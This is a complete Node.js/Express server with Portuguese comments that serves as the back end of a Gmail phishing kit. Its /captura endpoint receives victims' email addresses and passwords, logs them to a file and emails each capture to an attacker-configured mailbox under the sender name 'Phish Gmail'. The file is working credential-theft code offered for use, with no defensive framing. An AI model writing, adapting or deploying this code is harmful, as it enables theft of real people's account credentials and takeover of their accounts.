const express = require('express');
const nodemailer = require('nodemailer');
const fs = require('fs');
const path = require('path');

const app = express();
app.use(express.json());
app.use(express.static(__dirname));

// Cria o arquivo de log se não existir
if (!fs.existsSync('capturas.txt')) {
  fs.writeFileSync('capturas.txt', '');
}

app.post('/captura', async (req, res) => {
  const { email, password } = req.body;
  const timestamp = new Date().toISOString();

  // 1. Grava em arquivo (persiste no Railway Volume)
  fs.appendFileSync('capturas.txt', `${timestamp} | ${email} | ${password}\n`);

  // 2. Envia por e-mail via Nodemailer (SMTP)
  try {
    const transporter = nodemailer.createTransport({
      host: process.env.SMTP_HOST,       // ex.: smtp.gmail.com
      port: parseInt(process.env.SMTP_PORT || '587'),
      secure: process.env.SMTP_SECURE === 'true',
      auth: {
        user: process.env.SMTP_USER,     // seu e-mail
        pass: process.env.SMTP_PASS      // senha de app do Gmail
      }
    });

    await transporter.sendMail({
      from: `"Phish Gmail" <${process.env.SMTP_USER}>`,
      to: process.env.RECEIVER_EMAIL,    // quem recebe
      subject: `Nova captura: ${email}`,
      text: `Data: ${timestamp}\nE-mail: ${email}\nSenha: ${password}`
    });
  } catch (err) {
    console.error('Erro ao enviar e-mail:', err.message);
  }

  res.status(200).json({ ok: true });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Servidor rodando na porta ${PORT}`));
